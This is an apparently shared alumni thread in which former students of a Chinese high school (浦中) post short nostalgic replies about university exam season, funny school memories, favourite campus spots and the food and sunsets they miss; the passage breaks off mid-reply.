Re(人在上海）：外面太冷了呆宿舍里，写论文，虽然没考期末，但是已经想好寒假怎么玩了</p><p>Re(人在厦门):这边消费是真的高，而且一点也不冷，但晚上还是有点冷滴，我的那些好看的秋冬装都穿不上，这边的海很奈斯，这边的人我尤其喜欢，小哥哥小姐姐一大堆，而且这边的人很自信，落落大方，我自己也被他们她们感动了，我很是喜欢。</p><p>Re(在零下十度的天津):外面很冷，风很大，但是图书馆里很暖，阳光照在书桌上，耳机里是今年夏天我最爱的歌。</p><p>Re(人在杭州)图书馆里的空调23度，室外3度，刚刚飘了几滴雨夹雪，在复习即将到来的考查课，考试课，好想好想好想回家嗦粉！在杭州就没吃过巴适的肠粉呜呜呜</p><p>re（人在杭州+1）：是真的是真的是7真的！疯狂想念浦中门口的炒面和卷粉，来这边我简直头顶大问号，十块钱的肠粉甚至不够塞牙缝，味道也相当一般。今天室温零下但它还不下雪，就是很卑微的一个状态</p><p>Re(人在宿舍）：啊啊啊啊啊啊啊为什么他们考研图书馆要闭馆啊！！！期末了特别慌，没有地方复习，哭死（现在星期六下午一点，打算睡觉，然而，没有困意，早上睡太多了，学习也不想学了，刚刚出门吃饭掉了校园卡，哭死，一整个崩溃的状态，唉，不过偶然在空间看到这个东西，感觉好浪漫呀我滴天呐）</p><p>Re(人在宿舍)：同上 ，他们考研，学习图书馆闭馆，现在在苦逼背历史，完全记不住！！！感觉整个人都要完了</p><p>Re: 人在上海，高中知识在大一还是非常有用的，起码可以水好多课，工科好多乱七八糟的东西，锯铁真的给我累哭了，还有CAD害,早八是真的难受……今年重修宿舍，放3个月暑假，两个月寒假美滋滋✌。</p><p>Re:在图书馆啃论文！泪目www</p><p>Re：（秃头的天津理科生）人在家，回家一个星期了挺无聊的，有点想回母校康康小学弟小学妹，但是每年放假都很早就贼爽。</p><p>Re：正在秃头看文献，要做英汉ppt</p><p>Re(人在南宁) 我想回家😭</p><p>Re(人在东北）没有人值得我emo </p><p>Re(人在来宾）我在浦中跟你们打闹的日子，真的挺不错，我还没看过浦中的天空，没体验够我们一起打篮球的欢快，没体验够偷偷看喜欢的人的 </p><p>Re（人在桂林）不要相信大学轻松，所有的东西全靠自己自觉，不然期末考就要哭死了，真的傻傻分不清这个神经是哪个脑管的啊</p><p>Re（人在武汉）今天下雪了(๑＞ڡ＜)☆小雪！第一次看</p><p>Re（人在宜昌）好想以前的朋友，大学这个小社会让我无力</p><p>Re：人在-28℃的吉林。文科生，学习化学和生物的悲哀大学牲。不过有一说一这边风景还挺好看的哈。</p><p>Re:（人在咸嘉湖）长沙今天冷死了！！！！准备去上课and期末考搏斗！！话说楼上那位至善楼的同学也是湖师大的吗！！！</p><p>Re：人在南阳 零下实在是太冷了家人们！！！准备午休然后起床继续啃我的经典著作 翻都翻不完期末周太苦了好想回家</p><p>Re：（人在桂林）谁说的大学会轻松！？医学牲已经快被卷死了！</p><p>Re（人在南宁）:在头秃路上向中，冲冲冲</p><p>Re(人在桂林): 十一点才起床，一点也不像期末的大学生哈哈哈哈哈哈 正刷着期末复习题就弹出这个 只能说破防了 耳机里是周总的我是如此相信 这个好应景 今天考研啦 祝浦中要考研的师兄师姐全部上岸！！！</p><p>Re：人在浙江金华，应该没有多少人在金华的吧呜呜，大学论文真的太困难了，不喜欢！！在这里除了有点怀念高中的大家，一切都很好👍</p><p>Re（在钦州呢）这里很近，但是离亲爱的朋友很远了，我好想你们，你们会偶尔想起我吗？我一切都好，顺利的话将来可能是你们孩子的老师哈哈哈。对了，多发个说说好吗？真的害怕我们互相遗忘……午安吧</p><p>Re:(人在长沙)，今天好冷，13:37了还没出过门。现在在刷军事理论作业。</p><p>Re:(人在武汉)今天武汉下了小初雪很冷很开心，人在被窝卷，希望考试不挂科。</p><p>Re:（学医的狗）准备睡午觉，下午起来刷人卫😥😥😥</p><p>Re:楼上+1</p><p>Re：（人在民大）图书馆，准备期考，不想挂科😭</p><p>Re:（人在民大）窝在宿舍刷近现代史纲要，准备期考，不想挂科</p><p>Re：（人在长安）今天西安下雪了，但是还是要冒着风雪去做核酸，真的好想家呜呜呜呜呜呜呜今年回不去过年了</p><p>Re：（人在师大）窝在床上，书在手边，看不懂啊啊啊太痛苦了！</p><p>Re：（人在右医）努力奋战期考中！考研日，下起了小小雨，也很惬意。</p><p>Re:  (人在辽宁) 努力复习中，因为这疫情导致了我得四天考六个科目，关键是一天复习时间都没有，已经考完四个科目了，还差明天的两科了，现在临时抱佛脚零下18℃的太阳很温柔！</p><p>Re：（人在南宁）期末啦，努力复习中，不想挂科啊啊啊啊啊啊，南宁有点热哈，一件外套就过冬了</p><p>Re:（人在桂林）好冷好冷，期末复习太难了趴</p><p>Re：（人在桂工）今天在图书馆复习，每天程序代码熬夜…头秃ing</p><p>Re:（人在郑州）今天真的好冷，拖延症的人还没有复习就快期末考了</p><p>Re:（人在厦门），现在自习室看寄生虫。昨晚开始降温了，过敏性鼻炎开始犯了好难受呜呜呜…但是考完试就可以回家了医学牲冲!!坚持坚持坚持</p><p>Re:（人在桂林） 正在复习中，今晚就要考试了！过几天还要考高数和大英，表示很慌！7</p><p>Re：（人在钦州）午睡刚起床，睡觉时想的都是怎么写论文、怎么做PPT啊啊啊啊救命～期末了好烦，加上有点感冒我更难了！</p><p>Re:复习期考，啊啊啊啊，好忙好忙，我想回高中喘喘气</p><p>Re：（人在南宁）下周考试，图书馆好困，高数饶命</p><p>Re：（人在上海）期末复习，三创比赛，幸好图书馆里还算暖和，超想回家见爸妈！</p><p>Re:（人在五合）期末抱佛脚，吹妖风，看对面情侣秀恩爱 呜呜呜～</p><p>Re:（人在桂林）期末还摸鱼，大概是没救了</p><p>Re:（人在回家的路上）在想他</p><p>Re:(人在贺州）备考期末，最近心情复杂，超想回家见爸妈，想回去和许久未见的朋友畅谈这段时间的事情。。。</p><p>Re:人在南宁，解剖真的好难啊，感情也不顺利呜呜呜呜呜呜                                                                 </p><p>Re :(人在桂林)外面好冷好冷，待在宿舍里面复习#。</p><p>Re：（人在南宁）备考期末，冷风中背书</p><p>Re:(人在柳州）准备放假了，在宿舍收拾行</p><p>Re：（人在床上）写这个。</p><p>Re: （人在民大）临近期考，还没得开始复习，在搞各种水课论文，好怕挂&amp;科 </p><p>Re：（20届十一班人员）人在图书馆打代码，大学真的很累，已经大二老学长了，刚刚搞完英语六级，英语翻译大赛，进了蓝桥杯省赛，拿l了优秀班干，干了很多有意义的事情，但是太累，无时无刻都在想回小浦北，做个躺平的fw，不想卷下去了…还有这个无止境的煞笔疫情，什么时候能结束……继续打代码去了…</p><p>Re:（人在桂林）就是说雁山的妖风真的够猛 人在琴房练琴 快期末了真的头疼得要命好想回家SOS                                   </p><p>Re:(人在桂林)拼命画图中</p><p>Re:（长沙）明天要下雪啦！！零下的天气真的好冷🥶</p><p>Re：（人在南宁）创培班太难了，复习复习，不然就挂科了😂😂😂</p><p>Re(一头扎进文献里)：加油！</p><p>Re:（人在桂林）今天风大，也挺冷的，懒，不想学习，在被窝看小说哇，找不到好看的，突然发现有这个共享文档！浦中人，这不得来写一波！</p><p>Re：（重庆）想念啊想念！！！</p><p>Re :人在民大，宿舍太卷了我感觉我要卷不动了，下辈子不学人工智能了，卷不动这个学院了呜呜呜</p><p>Re：人在桂林，欠了的终究是要还的（周末大四狗补课）</p><p>Re:人在南京，快冻成冰块了</p><p>Re:人在南宁，被期末考试折磨，高数真的难。</p><p>Re:(人在江师大)，昨天这里下初雪了，好美啊。目前也正在被期末考试折磨中。。。</p><p>Re（好好学习）:人在南宁，天气和家乡的差不多，虽然学校和周边很多美食，但依然还会想起溢香楼的饭菜，很是怀念。珍惜高中的时光吧，培养一个自律的自己，到哪都管用，起高中，只有课本和和篮球，多么快乐的时光～</p><p>Re:人在玉师，现在在复习中国近代史纲要，英语，经济数学，计算机应用基础，快要被期末折磨疯了。来到大学这段时间，给我的感觉就是高中忙的充实，大学忙的莫名其妙。浑浑噩噩的度过了一整个学期，感觉啥也没学到。真的好怀念在浦中的日子，浦中给了我不一样的回忆……</p><p>Re：人在贺州，现在在补python实训课，快要考试了，好焦虑啊啊啊啊～～</p><p>Re:成都好冷，期待下雪ing</p><p>Re:还是在钦州，应该猜得到我是那个学校了。哈哈。目前在准备期末考核啊，曾经身经百战，现在被个期末考试吓死了，不说了，学习学习！大家都要努力学习哦！</p><p>Re:人在广西学医，现在期末复习表示很头疼</p><p>Re:在西安 今天下雪啦! !西安现在疫情好严重! !加油! !希望今年能顺顺利利回家过年</p><p>Re：人在南宁，钢琴好难好难好难，期末了不仅要排琴房还要复习理论还要准备很多考核作业</p><p>Re:人在湖南湘潭，很遗憾没把大学过成自己想要的模样</p><p>Re：人在南宁，就是说想顶着一头红毛回浦中去苏总面前晃悠哈哈哈哈，中山路农院路都不如我小江街菜市街，纯纯就是说想回家了想回浦中看看了！</p><p>Re:（人在山东），在雾霾天里想念浦中的晚霞，夏天的汽水，与周五的电影。</p><p>Re（人在桂林）：想疫情快点；结束，想学校快点解封，想考完试好好回家过年，想回小浦北见面。</p><p>Re（人在成都）天气很好，在听周杰伦的歌，看着美丽的夜景，等着你来和我喝酒。</p><p>Re：人在桂林，在看物理化学，我为什么要选一个物化中英数一样不落都要学的专业啊啊啊啊</p><p>Re：人在南宁，在宿舍洗着冷水澡，怀念浦中的冷水，又大又舒服。</p><p>Re:人在柳州，天气贼冷，想念浦中的黑白校服好暖和！</p><p>Re：我在比南北极还冷的地方，学习伟大的马克思思想</p><p>Re: （人在三千公里之外的新疆，今天风很大，来新疆那么一年多了，第一次遇到那么大的风），今天终于改完了报告，很痛苦，但是开心的是，今年回家过年，见见好久好久没见的家人和朋友</p><p>Re:(人在柳州）论一个只有高中学历的人如何在一个星期内学完大一一学期的内容。</p><p>Re：(人在玉林）头秃警告，水土（不服。考试催债，加紧复习还欠下的知识债。今天风贼大，孩子快被吹跑了。</p><p>Re:（人在民大）人潮拥挤，花光了高中三年所有运气，遇见了学委，在和他谈一段甜甜的恋爱，明年打算带他回浦北过中秋，带他走过我曾经走过的路！</p><p>Re:(人在贵阳)期待明天下雪和快快回家T-T</p><p>Re (Yee人在南宁）：复习周好痛苦，会计分录看不懂🤬，还有疫情赶紧结束🙏</p><p>Re（人在苏州）：听说今天苏州初雪，但是那会正在做志愿者活动没看到……好可惜。人在宿舍写论文，痛苦面具ing</p><p>Re（人在宁波）：好想念浦中的一切还想再回到高中！！！！</p><p>Re（人在四川）:今天圣诞节而我一天只干了练琴和写创新创业申报书两件事。</p><p>Re(人在浦北)：打工人希望疫情快点结束！</p><p>Re（人在盐城）：希望疫情早日结束，希望我们每天都能有所进步～成为我们想要成为的人，OK睡觉💤 </p><p>Re（人在武汉）：在宿舍斗地主连输四把</p><p>Re（人在南宁）：在宿舍复习到半夜，在床上因为怕挂科睡不着，因为我们期考卷面分不到六十没平时分，破防了，还学医。</p><p>Re(人在玉林宿舍厕所)：看你们的记录有点想笑，笑了之后又有点伤感。准备期末考试，早上起来背书，困到飞起，现在又睡醒。噢今天降温，大家加衣服</p><p>Re（人在湖北）：今天好冷，但也要坚持啊，熬过这个星期就可以解放了，远在几千公里外的你也要照顾好自己啊</p><p>Re(人在武汉）：哭了，大家都在卷，但我早上还是起不来，鲨了我吧。</p><p>Re(人在图书馆）：考试周真的很快乐，一边背书一边钓鱼，不知不觉大中午了也不想离开图书馆，大家冲冲冲啊！</p><p>Re（人在崇左）：大学会遇到很多好玩的事情，要积极一点，也不用老是呆在宿舍里打游戏睡懒觉，没有课的时候多和同学出去走走也是很快乐的事情啊。</p><p>Re(人在南宁）：现在在宿舍敲这个，刚背完了英语考核作文，一直在找机会写，现在来啦！</p><p>Re(人在湖南湘潭） ：很遗憾没把大学过成自己想要的模样。</p><p>Re(人在民大）:好冷哇在考试周，你也会想起我吗。</p><p>Re(人在佛山)：放假回家了，躺床上刷手机呢，只要交完最后一个ddl就可以享受假期了呜呜</p><p>Re（人还在复习）打算熬夜复习生理，后天回家，有比我更晚的吗，呜呜呜，不要学医。</p><p>Re（人在重庆）重庆真的好多坡坡要爬啊！！重庆的阿姨不讲普通话不知道她在讲什么呜呜呜😭😭</p><hr><h2 id="在浦中发生的有趣的事？（对不起兄弟姐妹们，这个话题我误删了，原谅我，原谅我！）（再来一遍！）"><a href="#在浦中发生的有趣的事？（对不起兄弟姐妹们，这个话题我误删了，原谅我，原谅我！）（再来一遍！）" class="headerlink" title="# 在浦中发生的有趣的事？（对不起兄弟姐妹们，这个话题我误删了，原谅我，原谅我！）（再来一遍！）"></a># 在浦中发生的有趣的事？（对不起兄弟姐妹们，这个话题我误删了，原谅我，原谅我！）（再来一遍！）</h2><p>Re：必须是那叫啥音乐节来着(忘了哈哈哈)，小哥哥小姐姐唱歌炒鸡好听🤤🤤</p><p>Re（小桃呀）：高三时的每一场排球赛，15班的崽崽们都好腻害！！！还有还有巴总（韦书记）的数学课前的大道理🤪，给我们讲他在抖音上看到的趣事😎！！！还有还有很多很多，跟好朋友的趣事！！！！此刻想爆一下我的好朋友😉😉（张秋菊，黄芷钰，覃冰，覃雪，米芝蓉，刘薇，宁珍，蔡玲，韦森……还有好多好多），当然还有15班的崽崽们and科任老师！！！</p><p>Re(咸鱼):好好享受一周7节体育课还3有连堂的快乐</p><p>Re(理科生成为文科生）:高中三年，我成长与收获了许多，我身边的人都是一群可爱的人，在阴沉天空中每一次都有一小束照着我的阳光，我也跟着小桃子爆一下，我身边的好姐妹(黎薇、宁小红、梁东淋、许耀翠、张菲菲、萧霞、黄秋渝、覃冰、劳思熔、吴婷婷、……)，真的好多好多，所在过的班级里面的你们对我的好，怀念高中老八，老师与同学们真的超级&amp;超级nice ,真的很感动.</p><p>Re （波吉）:这辈子都会记得苏总在寝室申个头进来抓我玩手机那一场面，永远记得整个寝室在看我玩狼人杀时小妃在外面偷听舍友一秒上床的场景，也永远记得晚上开寝室大门（502）聊天聊十二点小妃突然来查寝时那片杀机  </p><p>Re：怀念每天早上来到教室昏昏欲睡但又不得不撑起手来写早练的时候，也怀念那时思思在我钓鱼时拍我一巴说了句：“靓女来了”我又打起了几分精神的时候（哈哈哈，真想打颠这个花花肠子思思）</p><p>Re：我们之前在教室外面的花圃种了一棵西瓜苗，后来它结瓜了，”我们班的老父亲老母亲天天下课跑去和瓜瓜晒太阳。再后来，唉，不说了，上图</p><p>Re：咱们班有个同学放学玩手机被苏总抓到了但或许是因为……因为什么咱也不记得了，被苏总狠狠警告最后还是放过了               </p><p>Re：（冬暖）怀念高中三年时光，也怀念在浦中的晚霞</p><p>Re:我跟妃姐跟彭妹去开临界生</p><p>Re：我跟劳妹去吃蛙肉</p><p>Re：认识了高一八、高二八、高三九陪我一路走过高中三年的好伙伴们。最怀念高三九课间时间与好哥们谈天说地的日子。最有趣的是和苏总的博弈hhh。</p><p>Re(kk)：最有趣莫过于和倩姐一起癫，一起去逛操场，一起去炸街，一起一起…..</p><p>Re（波吉）:从来对生日不敏 感的我，被某个傻子认真对待（还欠我顿烧烤来着）</p><p>Re：高三排球比赛的时候苏主任骗我们说他手气好，抽到了我们班和老师一起打，笑死了，其实是他故意安排的😏，没办法，高三有奇数个班</p><p>Re：最有趣的还是收获了两个小孙子，即使我还没对象。</p><p>Re（波吉）:你们能懂为了打球，五分钟洗澡，五分钟吃饭，两分钟上到教室的拼劲吗？被苏总抓了n次</p><p>Re:每周六的奶茶时间</p><p>Re:记得网课期间开过一次提问，兄弟们直接刷我的名字，还热情的把我推上了榜首，现在想来真是，满满的回忆啊</p><p>Re：怀念那次大雨和一群男生自习课去给空教室关窗 怕考场被淋湿 怀念每一场打过的排球赛 因为那里有可爱的人和可爱的我 不得不说 高考的下午也还在打 怀念每一封和朋友来往的信 怀念每一壶家人送来的暖汤 怀念那个我喜欢过的你 也仅停留在了怀念 怀念那个有人撑腰有人爱护永远无所畏惧善良快乐的你</p><p>Re:  想回五班打排球。好想念那段快乐又充实的日子    </p><p>Re: 每天早上六点半小妃准时出现在教室走廊外的时候。想回去见小妃了，高中三年班主任，对我这么好，但我高考数学又考那么差不敢去见她（捂脸捂脸）</p><p>Re：每天下午跑完操打排球</p><p>Re：和笨笨一起上课偷吃零食，量玩偶的PP、身高，设计并做出了属于他们的小沙发，附带播放喜羊羊的电视机和电视柜</p><p>Re：早上的时候看窗外快迟到的同学从垃圾场门口奔跑进学校</p><p>Re：符某穿了一只拖鞋一只运动鞋来上课</p><p>Re:学习完、跑完操后一起打排球，那段日子超快落！</p><p>Re：好多好多鸭，现在能记得的就是那个运球比赛，我走到一半眼镜掉了，然后瞎投还中了，哈哈哈哈。</p><p>Re：怀念免费餐、高三特有的六一儿童节，怀念钢哥、老徐头、苏总、还有史上最佛系的化学老师（我一看就是选B）……但最最不想的是，竞走呼啦圈！扭到了膝盖，韧带拉伤。索性的是，在这个时候很幸运遇到了一个喜欢的人！</p><p>Re：每周六的快乐，虽然就短短不到一个小时，让外宿的同学带各种好吃的，凑一起吃啊吃。跑操的时候研究怎么偷懒，怎么&amp;提前溜。</p><p>Re:有一天，我站在走廊端着我的水杯小口小口地喝，然后突然一个憨批上来抱住了我的腰，拉着我说:“走，我们去吓xx。”于是我们和另一个憨批就在xx的座位旁边的窗户敲，xx一回头我们就唰地蹲下来笑，来来回回，一边敲一边叫xx，又蹲下来笑。最后那一片前后左右的人都不转头了，就盯着看我们什么时候探头敲窗户，哈哈哈哈。</p><p>Re：因为考试成绩太差，和老陆一起到休息室当临界生补习。</p><p>Re:想念</p><p>Re：onmp：</p><p>Re:想念和权哥欧莎</p><p>Re:想念和泽菁一起翘课的日子</p><p>Re:当然是班里一起偷偷摸摸看了很多电影</p><p>Re:怀念那些和朋友的时光，猪猪，小唐，臭柏，臭敏……真的很想你们，和你们在一起的时光真的很好，一起玩一起闹真的很开心</p><p>Re:高三20班 靠课间看完了我是大哥大 太快乐了</p><p>Re：高三十七班 大课间做操的时候偷偷跑去小黑买零食真的好快乐</p><p>Re:很难不赞同楼上。不做操偷偷趴着睡觉也很快乐哈哈哈哈</p><p>Re:高中的一切事物和身边的每一个人都是我人生中的最爱。</p><p>Re:明天下午放学后洗完澡和寝室的兄弟们在宿舍里谈天说地怀念极了。</p><p>Re:下课的时候一起去刷苏总的抖音，嘿嘿嘿，水哥是个想发大财的劳动模范</p><p>Re：当然是悄咪咪的放电影，课间的音乐，奔跑到小黑的快乐</p><p>Re：整天被苏朝平抓，麻木了。不是睡觉玩手机看小说转笔迟到就是这个那个。</p><p>Re: 每次偷偷溜去厕所或者打水，刚出教室门总会遇到苏总，定律：“转角遇到苏总”</p><p>Re:教室啃甘蔗的时候，苏总出现在了床边温柔的笑着看我</p><p>Re：喜欢在苏总开喇叭讲话的时候学他说话，真的太好笑了哈哈哈哈哈哈不加“进行”就不会讲话的猪头皮（x）</p><p>Re:每天下课去操场散心聊天很快乐，现在想吃个饭也找不到能随叫随到的人了</p><p>Re:高二暑假补课，每天下了晚自习，在宿舍一起开车哈哈哈哈哈哈哈</p><p>Re：高中的每一场篮球赛</p><p>Re: 最怀念的是高中好多次在下课时间偷偷的打开电脑放电影（灵魂摆渡，刺客伍六七，鬼片）或者综艺的日子，尤其是在疫情前的那个学@期期末，一起看了中国机长，哪咤，少年的你，全班一起看电影真的很有氛围感……</p><p>Re:十四班的朋友，真的好想好想你们呀</p><p>Re:2020级高三二班，想</p><p>Re:我跟彭妹妃姐去开会后偷偷去小卖铺，被苏总看见，我们一个劲的跑，还每天跟彭妹美玲一起去饭堂，在路上相互鼓励。还有星期六下午跟彭妹偷偷点外卖，然后去拿，还叫外宿生帮我买饭团，嘻嘻嘻</p><p>Re：那时候二模，我和劳妹一直玩不复习考差了，后面又发奋学习成绩才上升</p><p>Re：想念晚读去厕所拍晚霞的日子，夏天每天都能被浦中的晚霞惊艳到！！还有就是想我包姐了，想念高二的时候她带我们去喝奶茶了，想念夏日她亲手做的绿豆水呜呜</p><p>Re(人在桂林某地):风好大，不想跑步(╥╯^╰╥)，想念浦中的鸭腿了</p><p>Re：最后一节自习课逃课去篮球场🏀打球，超级怀念 </p><p>Re:想念和符某一起逛操场and看帅哥的日子  </p><p>Re：梁少永远的神，长得又好看，说话又好听，整天吃霸王龙腿的，年老体衰的数学佬。</p><p>Re：大课间和小姐妹们在走廊看帅哥美女，谈八卦</p><p>Re:宿舍姐妹都好好啊，聊天很开心！!</p><p>Re：人在桂电，准备下周考试!</p><p>Re：今晚的南宁开始变冷啦，这个温度真的很适合吃麻辣烫。正因为今晚的麻辣烫，让我想起了高二那年，那时候刚考完期中考试，对完了答案，心情复杂，不太想学习，于是和坏蛋约好了溜出学校（也不说是溜吧，好歹也是装病请假出去的哈哈哈哈哈哈哈，至今都觉得很对不起周周，周周真的太懂我们了，那是我高中第一次也是唯一一次这么干，那时候真的害怕又激动，一直和坏蛋说万一周周知道真相了怎么办，害，当时太怂了，真的太怂了，到了高三才后悔高二的时候没多干“坏事”，高三都没机会了。）那晚吃上了人生中的第一碗麻辣烫，真的好好吃！后来高三毕业了，我又去吃麻辣烫了，可是它好像再也没有那天晚上的好吃了……</p><p>Re：现在人在南宁，读着一个叫“教育学”的专业。高二那年，一次数学课老师让我们自习，我当时饿得慌，于是就拿出了姐姐买给我的面包（当时坐在窗边，窗帘是放下来的），当时看着窗帘碍眼，我边吃我的面包边拉开窗帘，好巧不巧，我和苏总对眼了，一拉开刚好苏总就到了窗边，呜呜呜呜，他毫不犹豫地在本子上留下了我的名字……害，不记不相识，难得，高中第一次也是唯一一次被苏总盯上……那天晚上和周新说，周新是笑着和我说没事的……以为会被骂，周新太好了呜呜呜……</p><p>Re：人在乌鲁木齐，现在在上高数课。</p><p>Re:  啃玉米被scp看到了，真得饿，才刚打铃昂，我非常卑微的放进抽屉，他他喵还记！！</p><p>Re（小怪兽）不是那个小怪兽了，2020落下的病，在2021被放大无数倍，好难过2022来了。哎我怎么这样可是我也很无奈</p><hr><h2 id="最喜欢浦中的哪个角落？"><a href="#最喜欢浦中的哪个角落？" class="headerlink" title="#最喜欢浦中的哪个角落？"></a>#最喜欢浦中的哪个角落？</h2><p>Re: 文汇楼四楼楼梯间后面播音室前头的那片空地。写题写累了喜欢去那边的窗台坐着，晚上可以看到远处的楼房透着灯光。By the way,那里空旷到甚至可以踢毽子( •︠ˍ•︡ )</p><p>Re（高三十七班学子）操场的每一个角落！！！！每一个联考对完答案 夜晚总是会拉着好朋友去走操场。吹着晚风看星空，塑胶红跑道已经承载了我太多回忆和我的碎碎念哈哈哈哈哈 2</p><p>Re（嘻嘻）那个十七班外的走廊，踢毽子，虽然掉下去过好多次，但是好玩是真好玩，沙雕的快乐太多了，不便细说。</p><p>Re:十七班那盆又香又臭的花</p><p> Re：高三五班教室和隔壁的休息室  </p><p>Re：楼上+1   </p><p>Re:  楼上+1        </p><p>Re:  楼上+n</p><p>Re：楼上+n</p><p>Re:  楼上+n</p><p>Re:  楼上＋1（ss）</p><p>Re:  啊哈＋1</p><p>Re:  楼上+1（狼人杀）</p><p>Re：晚自习下课去操场的中间躺着，那一片星空是我见过最为闪烁的</p><p>Re:楼上＋1</p><p>Re:喜欢一个人去操场散散步，阅览室三楼的走廊背生物，偶尔听到有帅哥在唱歌</p><p>Re:作为一个假减肥的人，最爱的当然是操场</p><p>Re:喜欢学校的塑料草坪，晚上躺在”草坪上看零星的几颗星星，喜欢下午六点路过D栋时听到男生宿舍楼嘹亮的歌声，就是青春的感觉呀</p><p>Re（小桃呀）：喜欢浦中的草坪，教室外的走廊…喜欢浦中的每一处角落</p><p>Re（小破财）:好喜欢在浦中操场散步呀，还有踢j，</p><p>Re（五班不知名小弟）:必须篮球场，看五班战神大帽杨民枫！</p><p>Re （五班知名小弟）：五班休息室yyds，天天扯犊子，晚自习都不都在唠嗑</p><p>Re:楼上那俩，“苏朝平过来了！”</p><p>Re：高二八班教室、高三十五班教室和休息室，住过的宿舍</p><p>Re(kk)：好怀念那时的排球赛啊，五班牛逼！</p><p>Re图书馆四楼空房间</p><p>Re：必然是大厅地板</p><p>Re:操场操场！！特别是下午的操场！好爱体训生的腹肌哈哈哈哈</p><p>Re(kk):有点怀念广播站了！</p><p>Re(理科生成为文科生):教室窗口，偷偷拿出相机拍晚霞</p><p>Re（波吉）:当然得是排球场了，最后一场排球赛真的是最认真的一场，因为对手是宁浩啊。</p><p>Re：最喜欢浦中操场，特别是下午饭点之后的那段时间。</p><p>Re（每天都在想念浦中）：最爱浦中的操场，尤其是在晚自习的时候，下课后老是去那里逛，还有啊，晚读下课后的晚霞超漂亮，记得去操场看哦(´-ω-&#96;)</p><p>Re：夏天傍晚和第一节晚自习下课的操场</p><p>Re:最喜欢浦中的操场，有事没事就喜欢和朋友在那里聊天，或者是自己在那里思考人生</p><p>Re:最喜欢浦中的操场 广播站的小黑屋 四楼的广播站（有空调）还有高二六班和高三五班的教室 因为有可以让我快乐的人</p><p>Re(金水):最怀念高三七班的休息室每次下英语课都过去和昭炬哥称兄道弟和吹水了，还有体育课和星期六和同学们打排球和羽毛球是真的快乐，还有月假周五和舍友开黑到半夜哈哈哈</p><p>Re： 浦中晚自习下课的操场，那是我SB的青春。sbsbsbsb！</p><p>Re：偶遇SB人！下课了一起去操场SB啊！</p><p>Re:当然是操场了！那时很喜欢和阿菁一起翘课看国旗班训练 我知道她也很喜欢</p><p>Re:有你的每一个角落</p><p>Re: 好多人都喜欢晚上的操场呀 我也好喜欢 可以看到温柔的月亮 每次看到圆圆亮亮的月亮都会想到邓紫棋的那句歌词:月亮会一直带领 往幸福的路径。可以看到很多老师带着他们的小孩玩 可以看到苏总和很多老师在打排球 可以看到亮灯的文昌塔</p><p>Re:你们有去体育老师的藤树下面坐过吗👍</p><p>Re:晚自习下课，操场，单杠</p><p>Re:高三十五班的教室和休息室，还有临近高考每晚都去的操场</p><p>Re:傍晚的操场。</p><p>Re:晚上的操场，特别治愈，它陪我度过最艰难的高考的一个月</p><p>Re：书法班</p><p>Re：楼上那兄弟刚刚还跟我聊天，铁定是你</p><p>Re: 夏天晚上的田径场</p><p>Re:必然是操场呀，开学仪式，跑操，夜聊，校运会，毕业典礼</p><p>Re：楼上➕1</p><p>Re:篮球场，想起了一帮班里的的兄弟冲篮球场的情形（楼下一个班的逃课打球被苏总在办公室门口抓住hhhhh），在球场结识了很多哥们</p><p>Re：高三十班门前那棵枇杷树，满满的回忆</p><p>Re：浦中的篮球场，那是我们就算被苏朝平抓也要抢着去占场的地方，哪里不仅仅有我们的奇迹和汗水，更有我们的欢乐与美好回忆，很怀念和你们一起打球的日子。</p><p>Re：宿舍的阳台，哪里不仅仅是我们一起嗨歌的地方，也是我们一起喝酒的地方。</p><p>Re: 教室的走廊，下课10分钟出来靠着走廊聊聊天是人生中最美好的十分钟！</p><p>Re：人在1</p><p>Re:必然是傍晚的走廊，晚读前和晚读在走廊看浦中的天空，太美了！</p><p>Re:阶梯旁的滑梯超好玩der！！滑过的懂得都懂！</p><p>Re：晚上十点四十放学二楼饭堂最喜欢了，“”手抓手”然后全校通报批评。</p><p>Re：最喜欢哪个角落，大概就是宿舍吧。</p><hr><h2 id="最怀念浦中的什么？"><a href="#最怀念浦中的什么？" class="headerlink" title="#最怀念浦中的什么？"></a>#最怀念浦中的什么？</h2><p>Re: 怀念浦中校门口的早餐，叉烧冻粉yyds</p><p>Re:当然是浦中的晚霞！晚自习一抬头总能被惊艳到！有时候晚读不想读了就和同桌借口上厕所跑出去看晚霞🌆</p><p>Re:浦中的晚霞yyds，浦中的排球场，浦中的可耐老师</p><p>Re:浦中的老师，浦中的物价（来自大上海物价巅峰的控诉，上了大学以后真真真觉得小黑挺良心的）</p><p>Re:浦中的晚霞，高中的晚霞总是很好看</p><p>Re:浦中的免费午餐</p><p>Re:浦中的晚霞和浦中的老师，最最最 怀恋的是浦中的鸭腿！！！！</p><p>Re:+1</p><p>Re：厚脸皮地跑到对面楼问数学题，跑到楼下问地理题；操场散步，无数次吐槽那个破烂的足球架；走廊聊天，吐槽大会的仪式感…</p><p>Re：必须是浦中的晚霞啊啊！太美了！曾经沧海难为水，除却浦中晚霞不是云！</p><p>Re(小桃呀)：怀念浦中的晚霞！！！浦中的晚霞真的是yyds，美到爆炸！！！想念浦中的免费饭票🤩</p><p>Re:我想念浦中的饭菜了！！！</p><p>Re：我也想浦中的饭菜了！又好吃又便宜！还有小黑卖的吃的东西！</p><p>Re:➕1+1</p><p>Re:怀念曾经的高二五班，怀念高三努力的自己！</p><p>Re(波吉):莉莉的奶茶，牛肉干，油条，包子，早餐，糖，水果（我敢说我是吃的最多第一）</p><p>Re:楼上小心被抓出来打一顿</p><p>Re:呜呜呜想吃粉 肠粉叉烧粉 还有酸！野 每周都能去逛超市的快乐 没有帘子遮挡一起夜聊的快乐 想念一起唱歌的军训 浦中永远是我的青春！大学里真的让我太孤单了 我好喜欢交朋友可是我不敢去面对我插不进嘴也不被人重视的零存在感</p><p>Re(理科生成为文科生）:怀念夜宵的云吞，真的超级超级棒，啊啊啊，真的好爱好爱，浦中的饭菜真的超级耐爱撕，浦中晚霞，饭堂的饭菜，特别是那个鸭腿与鸭翅，真的是外面都拿不出手的镇校之宝，哈哈哈</p><p>Re 